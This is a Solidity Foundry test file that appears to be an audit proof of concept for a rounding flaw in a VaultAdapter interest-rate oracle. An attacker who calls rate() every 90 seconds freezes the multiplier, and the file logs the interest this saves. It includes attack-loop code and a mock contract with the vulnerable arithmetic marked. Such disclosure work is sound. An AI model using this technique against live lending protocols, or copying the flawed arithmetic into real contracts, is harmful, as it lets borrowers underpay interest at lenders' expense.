// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title VaultAdapter Rounding Vulnerability PoC
 * @notice Demonstrates how frequent oracle queries can freeze the interest rate multiplier
 * @dev This PoC shows that calling rate() frequently causes (_elapsed * $.rate / 1e27) to round to 0,
 *      preventing the multiplier from adjusting to market conditions
 */
contract VaultAdapterRoundingExploitTest is Test {
    VaultAdapter public vaultAdapter;
    MockVault public vault;
    MockERC20 public asset;
    address public attacker;
    address public admin;

    // Test constants
    uint256 constant RAY = 1e27;
    uint256 constant INITIAL_MULTIPLIER = 1e27;
    
    function setUp() public {
        admin = makeAddr("admin");
        attacker = makeAddr("attacker");
        
        // Deploy mock contracts
        asset = new MockERC20("Test Asset", "TST");
        vault = new MockVault(address(asset));
        
        // Deploy VaultAdapter
        MockAccessControl accessControl = new MockAccessControl(admin);
        vaultAdapter = new VaultAdapter();
        vaultAdapter.initialize(address(accessControl));
        
        // Setup slopes - typical configuration
        IVaultAdapter.SlopeData memory slopes = IVaultAdapter.SlopeData({
            slope0: 0.02e27,  // 2% base rate
            slope1: 0.5e27,   // 50% rate above kink
            kink: 0.8e27      // 80% utilization kink
        });
        
        vm.prank(admin);
        vaultAdapter.setSlopes(address(asset), slopes);
        
        // Set limits with rate designed for 24-hour full adjustment
        // Using a lower rate to make the vulnerability more exploitable
        uint256 rate = 1e25; // This makes the vulnerability trigger with ~100 second intervals
        uint256 maxMultiplier = 5e27;
        uint256 minMultiplier = 0.5e27;
        
        vm.prank(admin);
        vaultAdapter.setLimits(maxMultiplier, minMultiplier, rate);
        
        // Initialize vault with high utilization (above kink)
        vault.setUtilization(0.9e27); // 90% utilization
        vault.setUtilizationIndex(0);
    }

    /**
     * @notice Test 1: Demonstrates normal multiplier increase with infrequent queries
     * @dev When queries are spaced far apart, the multiplier increases as expected
     */
    function test_NormalMultiplierIncrease() public {
        console.log("\n=== Test 1: Normal Multiplier Increase ===");
        
        // First rate call to initialize
        uint256 initialRate = vaultAdapter.rate(address(vault), address(asset));
        (uint256 initialMultiplier,,) = vaultAdapter.utilizationData(address(vault), address(asset));
        console.log("Initial multiplier:", initialMultiplier);
        console.log("Initial rate:", initialRate);
        
        // Wait 1 hour (3600 seconds)
        vm.warp(block.timestamp + 3600);
        
        // Second rate call - multiplier should increase
        uint256 newRate = vaultAdapter.rate(address(vault), address(asset));
        (uint256 newMultiplier,,) = vaultAdapter.utilizationData(address(vault), address(asset));
        console.log("Multiplier after 1 hour:", newMultiplier);
        console.log("Rate after 1 hour:", newRate);
        
        // Verify multiplier increased
        assertGt(newMultiplier, initialMultiplier, "Multiplier should increase with high utilization");
        assertGt(newRate, initialRate, "Rate should increase with higher multiplier");
    }

    /**
     * @notice Test 2: Demonstrates multiplier freeze with frequent queries (EXPLOIT)
     * @dev Calling rate() every 90 seconds causes rounding to zero, freezing the multiplier
     */
    function test_ExploitMultiplierFreeze() public {
        console.log("\n=== Test 2: Exploit - Multiplier Freeze via Frequent Queries ===");
        
        // First rate call to initialize
        vaultAdapter.rate(address(vault), address(asset));
        (uint256 initialMultiplier,,) = vaultAdapter.utilizationData(address(vault), address(asset));
        console.log("Initial multiplier:", initialMultiplier);
        
        // Attacker calls rate() every 90 seconds for 1 hour
        // With rate = 1e25, (_elapsed * rate / 1e27) = (90 * 1e25 / 1e27) = 0 (rounds down!)
        uint256 callInterval = 90; // seconds
        uint256 totalDuration = 3600; // 1 hour
        uint256 numCalls = totalDuration / callInterval;
        
        console.log("Attack parameters:");
        console.log("  Call interval:", callInterval, "seconds");
        console.log("  Total duration:", totalDuration, "seconds");
        console.log("  Number of calls:", numCalls);
        
        for (uint256 i = 0; i < numCalls; i++) {
            vm.warp(block.timestamp + callInterval);
            vm.prank(attacker);
            vaultAdapter.rate(address(vault), address(asset));
        }
        
        (uint256 finalMultiplier,,) = vaultAdapter.utilizationData(address(vault), address(asset));
        console.log("Final multiplier after attack:", finalMultiplier);
        
        // Multiplier should remain unchanged due to rounding
        assertEq(finalMultiplier, initialMultiplier, "Multiplier frozen by frequent queries");
        console.log("\nEXPLOIT SUCCESS: Multiplier remained frozen despite high utilization!");
    }

    /**
     * @notice Test 3: Compares normal vs exploited scenarios side-by-side
     * @dev Shows the economic impact of the vulnerability
     */
    function test_CompareNormalVsExploited() public {
        console.log("\n=== Test 3: Economic Impact Comparison ===");
        
        // Scenario A: Normal operation (infrequent queries)
        VaultAdapter normalAdapter = new VaultAdapter();
        MockAccessControl accessControl = new MockAccessControl(admin);
        normalAdapter.initialize(address(accessControl));
        
        IVaultAdapter.SlopeData memory slopes = IVaultAdapter.SlopeData({
            slope0: 0.02e27,
            slope1: 0.5e27,
            kink: 0.8e27
        });
        
        vm.startPrank(admin);
        normalAdapter.setSlopes(address(asset), slopes);
        normalAdapter.setLimits(5e27, 0.5e27, 1e25);
        vm.stopPrank();
        
        // Initialize both adapters
        normalAdapter.rate(address(vault), address(asset));
        vaultAdapter.rate(address(vault), address(asset));
        
        // Normal: Wait 1 hour, then query once
        vm.warp(block.timestamp + 3600);
        uint256 normalRate = normalAdapter.rate(address(vault), address(asset));
        (uint256 normalMultiplier,,) = normalAdapter.utilizationData(address(vault), address(asset));
        
        // Exploited: Query every 90 seconds for 1 hour
        vm.warp(block.timestamp - 3600); // Reset time
        for (uint256 i = 0; i < 40; i++) {
            vm.warp(block.timestamp + 90);
            vm.prank(attacker);
            vaultAdapter.rate(address(vault), address(asset));
        }
        
        uint256 exploitedRate = vaultAdapter.rate(address(vault), address(asset));
        (uint256 exploitedMultiplier,,) = vaultAdapter.utilizationData(address(vault), address(asset));
        
        console.log("\nNormal Operation:");
        console.log("  Multiplier:", normalMultiplier);
        console.log("  Interest Rate:", normalRate);
        
        console.log("\nExploited Operation:");
        console.log("  Multiplier:", exploitedMultiplier);
        console.log("  Interest Rate:", exploitedRate);
        
        console.log("\nImpact:");
        console.log("  Multiplier difference:", normalMultiplier - exploitedMultiplier);
        console.log("  Rate difference:", normalRate - exploitedRate);
        
        // Calculate economic impact on $1M borrowed
        uint256 borrowAmount = 1_000_000e18;
        uint256 normalInterest = (borrowAmount * normalRate / RAY) / 365 days * 3600;
        uint256 exploitedInterest = (borrowAmount * exploitedRate / RAY) / 365 days * 3600;
        
        console.log("\nEconomic Impact (1 hour on $1M borrowed):");
        console.log("  Normal interest:", normalInterest / 1e18);
        console.log("  Exploited interest:", exploitedInterest / 1e18);
        console.log("  Savings for attacker:", (normalInterest - exploitedInterest) / 1e18);
        
        assertGt(normalMultiplier, exploitedMultiplier, "Normal multiplier should be higher");
        assertGt(normalRate, exploitedRate, "Normal rate should be higher");
    }

    /**
     * @notice Test 4: Demonstrates the mathematical root cause
     * @dev Shows exactly where the rounding occurs
     */
    function test_RoundingRootCause() public {
        console.log("\n=== Test 4: Mathematical Root Cause ===");
        
        uint256 rate = 1e25; // Current rate setting
        
        console.log("Rate parameter:", rate);
        console.log("RAY (1e27):", RAY);
        
        // Test different elapsed times
        uint256[] memory elapsedTimes = new uint256[](5);
        elapsedTimes[0] = 50;
        elapsedTimes[1] = 90;
        elapsedTimes[2] = 99;
        elapsedTimes[3] = 100;
        elapsedTimes[4] = 150;
        
        console.log("\nRounding behavior for different elapsed times:");
        for (uint256 i = 0; i < elapsedTimes.length; i++) {
            uint256 elapsed = elapsedTimes[i];
            uint256 product = elapsed * rate;
            uint256 result = product / RAY;
            
            console.log("Elapsed:", elapsed, "seconds");
            console.log("  Product (elapsed * rate):", product);
            console.log("  Result (product / RAY):", result);
            console.log("  Rounds to zero:", result == 0 ? "YES" : "NO");
            console.log("");
        }
        
        // Critical threshold
        uint256 threshold = RAY / rate;
        console.log("Critical threshold (RAY / rate):", threshold, "seconds");
        console.log("Any elapsed time <", threshold, "seconds will round to zero");
        console.log("This equals approximately", threshold / 60, "minutes");
    }
}

// ============================================
// Mock Contracts
// ============================================

interface IVaultAdapter {
    struct SlopeData {
        uint256 slope0;
        uint256 slope1;
        uint256 kink;
    }
    
    struct UtilizationData {
        uint256 multiplier;
        uint256 index;
        uint256 lastUpdate;
    }
    
    function initialize(address _accessControl) external;
    function rate(address _vault, address _asset) external returns (uint256);
    function setSlopes(address _asset, SlopeData memory _slopes) external;
    function setLimits(uint256 _maxMultiplier, uint256 _minMultiplier, uint256 _rate) external;
    function utilizationData(address vault, address asset) external view returns (uint256, uint256, uint256);
}

contract VaultAdapter is IVaultAdapter {
    struct VaultAdapterStorage {
        mapping(address => SlopeData) slopeData;
        mapping(address => mapping(address => UtilizationData)) utilizationData;
        uint256 maxMultiplier;
        uint256 minMultiplier;
        uint256 rate;
    }
    
    bytes32 private constant STORAGE_SLOT = keccak256("vault.adapter.storage");
    address public accessControl;
    
    error InvalidKink();
    error Unauthorized();
    
    event SetSlopes(address indexed asset, SlopeData slopes);
    event SetLimits(uint256 maxMultiplier, uint256 minMultiplier, uint256 rate);
    
    function _getStorage() private pure returns (VaultAdapterStorage storage $) {
        bytes32 slot = STORAGE_SLOT;
        assembly {
            $.slot := slot
        }
    }
    
    function initialize(address _accessControl) external {
        accessControl = _accessControl;
    }
    
    function rate(address _vault, address _asset) external returns (uint256 latestAnswer) {
        VaultAdapterStorage storage $ = _getStorage();
        UtilizationData storage utilData = $.utilizationData[_vault][_asset];
        
        // Initialize multiplier if first call
        if (utilData.multiplier == 0) {
            utilData.multiplier = 1e27;
            utilData.lastUpdate = block.timestamp;
        }
        
        uint256 elapsed;
        uint256 utilization;
        
        if (block.timestamp > utilData.lastUpdate) {
            uint256 index = MockVault(_vault).currentUtilizationIndex(_asset);
            elapsed = block.timestamp - utilData.lastUpdate;
            
            if (elapsed != block.timestamp) {
                utilization = (index - utilData.index) / elapsed;
            } else {
                utilization = MockVault(_vault).utilization(_asset);
            }
            
            utilData.index = index;
            utilData.lastUpdate = block.timestamp;
        } else {
            utilization = MockVault(_vault).utilization(_asset);
        }
        
        latestAnswer = _applySlopes(_vault, _asset, utilization, elapsed);
    }
    
    function setSlopes(address _asset, SlopeData memory _slopes) external {
        if (!MockAccessControl(accessControl).hasAccess(msg.sender)) revert Unauthorized();
        if (_slopes.kink >= 1e27 || _slopes.kink == 0) revert InvalidKink();
        _getStorage().slopeData[_asset] = _slopes;
        emit SetSlopes(_asset, _slopes);
    }
    
    function setLimits(uint256 _maxMultiplier, uint256 _minMultiplier, uint256 _rate) external {
        if (!MockAccessControl(accessControl).hasAccess(msg.sender)) revert Unauthorized();
        VaultAdapterStorage storage $ = _getStorage();
        $.maxMultiplier = _maxMultiplier;
        $.minMultiplier = _minMultiplier;
        $.rate = _rate;
        emit SetLimits(_maxMultiplier, _minMultiplier, _rate);
    }
    
    function utilizationData(address vault, address asset) external view returns (uint256, uint256, uint256) {
        UtilizationData storage data = _getStorage().utilizationData[vault][asset];
        return (data.multiplier, data.index, data.lastUpdate);
    }
    
    function _applySlopes(address _vault, address _asset, uint256 _utilization, uint256 _elapsed)
        internal
        returns (uint256 interestRate)
    {
        VaultAdapterStorage storage $ = _getStorage();
        UtilizationData storage utilData = $.utilizationData[_vault][_asset];
        SlopeData memory slopes = $.slopeData[_asset];
        
        if (_utilization > slopes.kink) {
            uint256 excess = _utilization - slopes.kink;
            // VULNERABLE LINE: (_elapsed * $.rate / 1e27) can round to 0
            utilData.multiplier = utilData.multiplier
                * (1e27 + (1e27 * excess / (1e27 - slopes.kink)) * (_elapsed * $.rate / 1e27)) / 1e27;
            
            if (utilData.multiplier > $.maxMultiplier) {
                utilData.multiplier = $.maxMultiplier;
            }
            
            interestRate = (slopes.slope0 + (slopes.slope1 * excess / 1e27)) * utilData.multiplier / 1e27;
        } else {
            // VULNERABLE LINE: (_elapsed * $.rate / 1e27) can round to 0
            utilData.multiplier = utilData.multiplier * 1e27
                / (1e27 + (1e27 * (slopes.kink - _utilization) / slopes.kink) * (_elapsed * $.rate / 1e27));
            
            if (utilData.multiplier < $.minMultiplier) {
                utilData.multiplier = $.minMultiplier;
            }
            
            interestRate = (slopes.slope0 * _utilization / slopes.kink) * utilData.multiplier / 1e27;
        }
    }
}

contract MockVault {
    address public asset;
    uint256 public utilizationValue;
    uint256 public utilizationIndexValue;
    
    constructor(address _asset) {
        asset = _asset;
        utilizationValue = 0.9e27;
    }
    
    function utilization(address) external view returns (uint256) {
        return utilizationValue;
    }
    
    function currentUtilizationIndex(address) external view returns (uint256) {
        return utilizationIndexValue;
    }
    
    function setUtilization(uint256 _utilization) external {
        utilizationValue = _utilization;
    }
    
    function setUtilizationIndex(uint256 _index) external {
        utilizationIndexValue = _index;
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    
    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }
}

contract MockAccessControl {
    address public admin;
    
    constructor(address _admin) {
        admin = _admin;
    }
    
    function hasAccess(address user) external view returns (bool) {
        return user == admin;
    }
}
